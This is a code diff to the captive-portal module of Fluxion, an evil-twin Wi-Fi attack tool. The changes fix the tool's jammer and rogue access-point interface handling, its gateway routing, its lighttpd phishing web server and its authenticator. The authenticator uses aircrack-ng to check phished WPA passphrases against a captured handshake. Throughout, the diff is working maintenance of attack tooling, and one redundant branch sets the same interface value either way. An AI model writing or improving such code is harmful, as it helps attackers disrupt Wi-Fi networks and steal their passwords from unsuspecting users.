@@ -53,7 +53,12 @@ captive_portal_set_jammer_interface() {
   fi
 
   echo "Succeeded get jammer interface." > $FLUXIONOutputDevice
-  CaptivePortalJammerInterface=${FluxionInterfaces[$selectedInterface]}
+  # Get the actual interface to use (renamed or original)
+  if interface_is_real "$selectedInterface"; then
+    CaptivePortalJammerInterface="$selectedInterface"
+  else
+    CaptivePortalJammerInterface=${FluxionInterfaces[$selectedInterface]}
+  fi
 }
 
 captive_portal_ap_interfaces() {
@@ -68,12 +73,14 @@ captive_portal_unset_ap_interface() {
   CaptivePortalAccessPointInterfaceOriginal=""
 
   if [ ! "$CaptivePortalAccessPointInterface" ]; then return 1; fi
-  if [ "$CaptivePortalAccessPointInterface" = \
-    "${CaptivePortalJammerInterface}v" ]; then
-    if ! iw dev $CaptivePortalAccessPointInterface del \
-      &> $FLUXIONOutputDevice; then
-      fluxion_conditional_bail "Unable to remove virtual interface!"
-      exit 1
+  
+  # Check if it's a virtual interface (ends with 'v')
+  if [[ "$CaptivePortalAccessPointInterface" == *v ]]; then
+    if [ -n "$CaptivePortalAccessPointInterface" ] && interface_physical "$CaptivePortalAccessPointInterface"; then
+      if ! iw dev "$CaptivePortalAccessPointInterface" del \
+        &> $FLUXIONOutputDevice; then
+        echo "Warning: Unable to remove virtual interface $CaptivePortalAccessPointInterface" > $FLUXIONOutputDevice
+      fi
     fi
   fi
   CaptivePortalAccessPointInterface=""
@@ -100,7 +107,12 @@ captive_portal_set_ap_interface() {
   fi
 
   echo "Succeeded get ap interface." > $FLUXIONOutputDevice
-  CaptivePortalAccessPointInterface=${FluxionInterfaces[$selectedInterface]}
+  # Get the actual interface to use (renamed or original)
+  if interface_is_real "$selectedInterface"; then
+    CaptivePortalAccessPointInterface="$selectedInterface"
+  else
+    CaptivePortalAccessPointInterface=${FluxionInterfaces[$selectedInterface]}
+  fi
 
   # If interfaces are the same, we need an independent virtual interface.
   if [ "$CaptivePortalAccessPointInterface" = \
@@ -109,15 +121,21 @@ captive_portal_set_ap_interface() {
     # Have fluxion_get_interface return a virutal interface if the primary
     # interface is in used by something else (virtual reservation?).
     echo "Virtual interface required, attempting." > $FLUXIONOutputDevice
-    if ! iw dev $CaptivePortalJammerInterface interface \
-      add ${CaptivePortalJammerInterface}v type managed \
+    # Use the renamed interface (the key that maps to original), not the original
+    local physicalInterface="$selectedInterface"
+    if ! interface_is_real "$selectedInterface"; then
+      # selectedInterface is renamed, use it directly
+      physicalInterface="$selectedInterface"
+    fi
+    if ! iw dev "$physicalInterface" interface \
+      add "${physicalInterface}v" type managed \
       2> $FLUXIONOutputDevice; then
       echo -e "$FLUXIONVLine $CaptivePortalCannotStartInterfaceError"
       sleep 5
       return 2
     fi
     echo "Virtual interface created successfully." > $FLUXIONOutputDevice
-    CaptivePortalAccessPointInterface=${CaptivePortalJammerInterface}v
+    CaptivePortalAccessPointInterface=${physicalInterface}v
   fi
 }
 
@@ -859,7 +877,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
         # Aircrack-ng
         # Check if we've got the correct password by looking for
         # anything other than \"Passphrase not in\" or \"KEY NOT FOUND\".
-        local -r verifiedCondition="aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | grep -Eqi \"Passphrase not in|KEY NOT FOUND\""
+        local -r verifiedCondition="! aircrack-ng -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | grep -Eqi \"Passphrase not in|KEY NOT FOUND\""
         ;;
     esac
     echo "
@@ -1127,7 +1145,9 @@ captive_portal_unset_routes() {
     sandbox_remove_workfile "$FLUXIONWorkspacePath/ip_forward"
   fi
 
-  ip addr del $CaptivePortalGatewayAddress/24 dev $CaptivePortalAccessInterface 2>/dev/null
+  if [ "$CaptivePortalAccessInterface" ] && [ "$CaptivePortalGatewayAddress" ]; then
+    ip addr del "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface" 2>/dev/null
+  fi
 }
 
 # Set up DHCP / WEB server
@@ -1135,7 +1155,9 @@ captive_portal_unset_routes() {
 captive_portal_set_routes() {
   # Give an address to the gateway interface in the rogue network.
   # This makes the interface accessible from the rogue network.
-  ip addr add $CaptivePortalGatewayAddress/24 dev $CaptivePortalAccessInterface
+  if [ "$CaptivePortalAccessInterface" ] && [ "$CaptivePortalGatewayAddress" ]; then
+    ip addr add "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface" 2>/dev/null
+  fi
 
   # Save the system's routing state to restore later.
   cp "/proc/sys/net/ipv4/ip_forward" "$FLUXIONWorkspacePath/ip_forward"
@@ -1374,8 +1396,14 @@ stop_attack() {
 
   # Signal any authenticator to stop authentication loop.
   if [ $skip_authenticator_kill -eq 0 ]; then
+    # Kill the authenticator xterm window silently.
+    if [ "$CaptivePortalAuthenticatorServiceXtermPID" ]; then
+      kill $CaptivePortalAuthenticatorServiceXtermPID &> /dev/null
+      CaptivePortalAuthenticatorServiceXtermPID=""
+    fi
+    
     fluxion_kill_lineage "--signal SIGABRT" \
-      "xterm.+captive_portal_authenticator\\.sh"
+      "xterm.+captive_portal_authenticator\\.sh" &> /dev/null
     pkill -9 -f "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" \
       &> $FLUXIONOutputDevice
   fi
@@ -1517,6 +1545,8 @@ start_attack() {
     >> $FLUXIONOutputDevice
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
+  # Clear any previous log entries
+  > "$FLUXIONWorkspacePath/lighttpd.log"
   lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" \
     &> $FLUXIONOutputDevice
   CaptivePortalWebServicePID=$!
@@ -1568,8 +1598,9 @@ start_attack() {
     -title "FLUXION AP Authenticator" \
     -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
 
-  authService=$!
-  echo "Auth Service: $authService" \
+  CaptivePortalAuthenticatorServiceXtermPID=$!
+  disown
+  echo "Auth Service: $CaptivePortalAuthenticatorServiceXtermPID" \
     >> $FLUXIONOutputDevice
 }
 
